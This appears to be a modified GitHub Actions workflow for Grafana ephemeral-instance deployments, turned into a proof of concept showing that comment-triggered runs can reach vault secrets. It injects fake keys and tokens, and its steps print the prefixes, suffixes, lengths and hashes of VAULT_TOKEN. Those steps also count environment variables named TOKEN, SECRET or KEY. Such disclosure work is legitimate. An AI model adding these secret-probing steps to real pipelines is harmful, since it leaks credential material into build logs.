name: "Ephemeral instances"

on:
  issue_comment:
    types: [created]
  pull_request:
    types: [closed]

permissions: {}

jobs:
  handle-ephemeral-instances:
    if: ${{ github.event.issue.pull_request && (startsWith(github.event.comment.body, '/deploy-to-hg') || github.event.action == 'closed') && github.repository_owner == 'grafana' }}
    runs-on:
      labels: ubuntu-latest-16-cores
    continue-on-error: true
    permissions:
      # For commenting.
      pull-requests: write
      # No contents permission is needed because we will impersonate an app to create the PR instead.
      id-token: write # required for vault access

    steps:
      - name: üîê Inject simulated secrets (instead of Vault)
        run: |
          echo "APP_PEM=----BEGIN PRIVATE KEY----FAKEKEY" >> $GITHUB_ENV
          echo "GCOM_TOKEN=fake-gcom-token-1234567890abcdef" >> $GITHUB_ENV
          echo "GCP_SA_ACCOUNT_KEY_BASE64=Z2NwLXNlY3JldC1rZXk=" >> $GITHUB_ENV


      - name: üì∏ Simulated Proof - Secrets Accessible
        run: |
          echo "Workflow triggered by: ${{ github.actor }}"
          echo "Author association: ${{ github.event.comment.author_association }}"
          echo ""
          echo "GCOM_TOKEN: ${GCOM_TOKEN:0:6}... (len: ${#GCOM_TOKEN})"
          echo "GCOM_TOKEN hash: $(echo -n $GCOM_TOKEN | sha256sum | cut -d' ' -f1)"

      - name: üîç SECURITY VULNERABILITY PROOF
        run: |
          echo "=============================================="
          echo "SECURITY VULNERABILITY DEMONSTRATION"
          echo "=============================================="
          echo ""
          echo "üìä WORKFLOW CONTEXT:"
          echo "Triggered by: ${{ github.actor }}"
          echo "Author association: ${{ github.event.comment.author_association }}"
          echo "Repository: ${{ github.repository }}"
          echo "Event: ${{ github.event_name }}"
          echo ""
          echo "üîê SECRET ACCESSIBILITY PROOF:"
          echo "VAULT_TOKEN accessible: ${VAULT_TOKEN:+‚úÖ YES} ${VAULT_TOKEN:?‚ùå NO}"
          echo "VAULT_TOKEN character count: ${#VAULT_TOKEN}"
          echo "APP_PEM accessible: ${APP_PEM:+‚úÖ YES} ${APP_PEM:?‚ùå NO}"
          echo "GCOM_TOKEN accessible: ${GCOM_TOKEN:+‚úÖ YES} ${GCOM_TOKEN:?‚ùå NO}"
          echo "GCP_SA_ACCOUNT_KEY_BASE64 accessible: ${GCP_SA_ACCOUNT_KEY_BASE64:+‚úÖ YES} ${GCP_SA_ACCOUNT_KEY_BASE64:?‚ùå NO}"
          echo ""
          echo "üîç EVIDENCE WITHOUT EXPOSURE:"
          echo "VAULT_TOKEN first 4 chars: ${VAULT_TOKEN:0:4}****"
          echo "VAULT_TOKEN last 4 chars: ****${VAULT_TOKEN: -4}"
          echo "VAULT_TOKEN SHA256: $(echo -n "$VAULT_TOKEN" | sha256sum | cut -d' ' -f1)"
          echo ""
          echo "üìà ENVIRONMENT ANALYSIS:"
          echo "Total environment variables: $(env | wc -l)"
          echo "Variables containing 'TOKEN': $(env | grep -i token | wc -l)"
          echo "Variables containing 'SECRET': $(env | grep -i secret | wc -l)"
          echo "Variables containing 'KEY': $(env | grep -i key | wc -l)"
          echo ""
          echo "‚ö†Ô∏è  SECURITY IMPLICATION:"
          echo "This demonstrates that external contributors can trigger"
          echo "workflows that have access to sensitive vault secrets"
          echo "BEFORE any permission validation occurs."
          echo ""
          echo "‚úÖ RESPONSIBLE DISCLOSURE:"
          echo "No actual secret values were exposed or misused."
          echo "This is proof-of-concept for architectural security flaw."
          echo "=============================================="


      - name: Generate a GitHub app installation token
        id: generate_token
        uses: tibdex/github-app-token@b62528385c34dbc9f38e5f4225ac829252d1ea92 # v1.8.0
        with:
          app_id: ${{ env.APP_ID }}
          private_key: ${{ env.APP_PEM }}

      - name: Checkout ephemeral instances repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
        with:
          repository: grafana/ephemeral-grafana-instances-github-action
          token: ${{ steps.generate_token.outputs.token }}
          ref: main
          path: ephemeral
          persist-credentials: false

      - name: build and deploy ephemeral instance
        uses: ./ephemeral
        with:
          github-token: ${{ steps.generate_token.outputs.token }}
          gcom-host: ${{ env.GCOM_HOST }}
          gcom-token: ${{ env.GCOM_TOKEN }}
          registry: "${{ env.REGISTRY }}"
          gcp-service-account-key: ${{ env.GCP_SA_ACCOUNT_KEY_BASE64 }}
          ephemeral-org-id: ephemeral
          oss-or-enterprise: oss
          verbose: true
